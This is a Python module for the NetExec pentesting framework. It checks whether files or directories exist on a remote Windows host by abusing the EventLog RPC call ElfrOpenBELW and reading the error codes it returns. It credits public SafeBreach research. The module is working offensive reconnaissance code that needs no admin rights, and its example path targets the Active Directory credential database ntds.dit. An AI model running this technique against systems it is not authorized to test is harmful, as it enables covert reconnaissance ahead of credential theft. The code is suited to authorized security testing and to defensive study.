"""
MS-EVEN file existence check via EventLog RPC
Based on research by @SafeBreach (Yarin A.)
https://safebreach.com/blog/abusing-windows-event-log-service-to-check-file-existence/

Module by @pixis
"""

import enum

from impacket.dcerpc.v5 import even
from impacket.dcerpc.v5.dtypes import RPC_UNICODE_STRING
from impacket.dcerpc.v5.transport import DCERPCTransportFactory
from impacket.dcerpc.v5.even import DCERPCSessionError
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE

from nxc.helpers.misc import CATEGORY


class FileStatus(enum.Enum):
    FILE_DOES_NOT_EXIST = 0xC0000034
    FILE_EXISTS_AND_IS_DIRECTORY = 0xC00000BA
    FILE_EXISTS = 0xC000018E
    FILE_EXISTS_LOCKED = 0xC0000022
    PATH_SYNTAX_BAD = 0xC000003B


class NXCModule:
    """
    Detect file/directory presence on a remote host via MS-EVEN (EventLog) RPC.
    Does not require administrative privileges.

    Based on research by @SafeBreach - uses ElfrOpenBELW primitive to infer file status
    from the returned error code.

    Module by @pixis
    """

    name = "check_file_dir"
    description = "Detect file/directory presence via MS-EVEN RPC (no admin required)"
    supported_protocols = ["smb"]
    category = CATEGORY.ENUMERATION

    def __init__(self):
        self.context = None
        self.module_options = None
        self.path = None

    def options(self, context, module_options):
        r"""
        PATH        Specific path to check on the remote host.
                    Example: -o PATH='C:\Windows\NTDS\ntds.dit'
        """
        self.path = module_options.get("PATH")

    def on_login(self, context, connection):
        if self.path is None:
            context.log.fail("You need to specify a path to check")
            return

        target = connection.host if not connection.kerberos else f"{connection.hostname}.{connection.domain}"

        try:
            rpc_transport = DCERPCTransportFactory(rf"ncacn_np:{target}[\pipe\eventlog]")
            rpc_transport.setRemoteHost(connection.host)
            rpc_transport.set_credentials(
                connection.username,
                connection.password,
                connection.domain,
                connection.lmhash,
                connection.nthash,
                connection.aesKey,
            )
            if connection.kerberos:
                rpc_transport.set_kerberos(True, kdcHost=connection.kdcHost)

            dce = rpc_transport.get_dce_rpc()
            if connection.kerberos:
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
            dce.set_auth_level(5)  # RPC_C_AUTHN_LEVEL_PKT_INTEGRITY
            dce.connect()
            dce.bind(even.MSRPC_UUID_EVEN)
        except Exception as e:
            context.log.fail(f"Failed to connect to EventLog RPC: {e}")
            return

        self._check_path(context, dce, self.path)

        try:
            dce.disconnect()
        except Exception:
            pass

    def _do_rpc_check(self, dce, path):
        """Send the ElfrOpenBELW request and return the error code, or None if no exception."""
        unicode_path = RPC_UNICODE_STRING()
        unicode_path["Data"] = path.rstrip("\\")
        unicode_path.fields["MaximumLength"] += 1
        try:
            even.hElfrOpenBELW(dce, unicode_path)
            return None  # Unexpected success
        except DCERPCSessionError as e:
            return e.get_error_code()

    def _strip_drive(self, path):
        """Replace drive letter prefix (e.g. C:\\) with a bare backslash."""
        if len(path) >= 3 and path[1] == ":" and path[2] == "\\":
            return path[2:]  # "\Windows\..." instead of "C:\Windows\..."
        return path

    def _check_path(self, context, dce, path):
        """
        Returns True if the path exists (file or directory), False otherwise.
        Automatically retries without drive letter if the server rejects the syntax.
        """
        error_code = self._do_rpc_check(dce, path)

        # Some Windows versions reject paths with a drive letter (e.g. Windows 10/Server 2022)
        if error_code == FileStatus.PATH_SYNTAX_BAD.value:
            stripped = self._strip_drive(path)
            context.log.debug(f"PATH_SYNTAX_BAD for '{path}', retrying as '{stripped}'")
            error_code = self._do_rpc_check(dce, stripped)

        if error_code is None or error_code == FileStatus.FILE_EXISTS.value:
            context.log.highlight(f"EXISTS (file): {path}")
            return True
        elif error_code == FileStatus.FILE_EXISTS_AND_IS_DIRECTORY.value:
            context.log.highlight(f"EXISTS (directory): {path}")
            return True
        elif error_code == FileStatus.FILE_EXISTS_LOCKED.value:
            context.log.highlight(f"EXISTS (locked/protected): {path}")
            return True
        elif error_code == FileStatus.FILE_DOES_NOT_EXIST.value:
            context.log.fail(f"NOT FOUND: {path}")
            return False
        else:
            context.log.debug(f"Unexpected error for {path}: 0x{error_code:08X}")
            return False
